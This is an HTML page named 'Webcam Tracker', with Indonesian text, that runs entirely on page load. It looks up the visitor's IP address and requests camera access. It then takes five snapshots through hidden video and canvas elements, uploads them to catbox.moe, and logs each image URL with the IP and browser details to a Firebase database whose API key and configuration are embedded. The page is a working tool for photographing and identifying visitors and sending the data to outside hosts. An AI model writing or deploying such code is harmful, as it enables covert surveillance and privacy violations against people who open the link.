<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Webcam Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    video, canvas { display: none; }
    body { 
      background: #000; 
      color: #0f0; 
      font-family: monospace;
      text-align: center;
      padding: 2em;
    }
    .status {
      margin: 20px 0;
      padding: 10px;
      border: 1px solid #0f0;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1>Webcam Tracker</h1>
  <div class="status" id="status">Memulai...</div>
  
  <script>
    // ‚úÖ Konfigurasi Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // üîß Setup elemen
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const statusEl = document.getElementById('status');
    document.body.appendChild(video);
    document.body.appendChild(canvas);

    // üéõÔ∏è Konfigurasi
    let photoCount = 0;
    const maxPhotos = 5;
    let visitorIP = "Unknown";
    const visitTime = new Date().toLocaleString('id-ID');

    // üì§ Fungsi upload ke Catbox.moe
    function uploadToCatbox(blob) {
      return new Promise((resolve, reject) => {
        const formData = new FormData();
        formData.append('file', blob, `webcam_${Date.now()}.jpg`);

        fetch('https://catbox.moe/user/api.php', {
          method: 'POST',
          body: formData
        })
        .then(response => response.text())
        .then(url => {
          if(url.startsWith('http')) {
            resolve(url);
          } else {
            reject(new Error('Upload gagal: ' + url));
          }
        })
        .catch(err => reject(err));
      });
    }

    // üåê Ambil IP pengunjung
    statusEl.textContent = "üîç Mendeteksi IP...";
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        visitorIP = data.ip;
        statusEl.textContent = "‚úÖ IP terdeteksi: " + visitorIP;
        startCamera();
      })
      .catch(err => {
        statusEl.textContent = "‚ö†Ô∏è Gagal deteksi IP: " + err.message;
        startCamera();
      });

    // üì∑ Akses kamera
    function startCamera() {
      statusEl.textContent = "üì∑ Mengakses kamera...";
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = () => {
            statusEl.textContent = "üì∏ Kamera siap!";
            capturePhotos();
          };
        })
        .catch(err => {
          statusEl.textContent = "‚ùå Akses kamera ditolak: " + err.message;
        });
    }

    // üñºÔ∏è Ambil foto
    async function capturePhotos() {
      while (photoCount < maxPhotos) {
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        try {
          statusEl.textContent = `üì§ Mengupload foto ${photoCount + 1}/${maxPhotos}...`;
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
          const imageUrl = await uploadToCatbox(blob);
          
          await database.ref('webcam_snapshots').push({
            url: imageUrl,
            timestamp: Date.now(),
            ip: visitorIP,
            userAgent: navigator.userAgent,
            time: new Date().toLocaleString('id-ID')
          });
          
          photoCount++;
          statusEl.textContent = `‚úÖ Foto ${photoCount} berhasil! URL: ${imageUrl}`;
        } catch (err) {
          statusEl.textContent = "‚ùå Error: " + err.message;
        }
      }
      
      statusEl.textContent = "üéâ Selesai! 5 foto telah diambil.";
      video.srcObject.getTracks().forEach(track => track.stop());
    }
  </script>
</body>
</html>
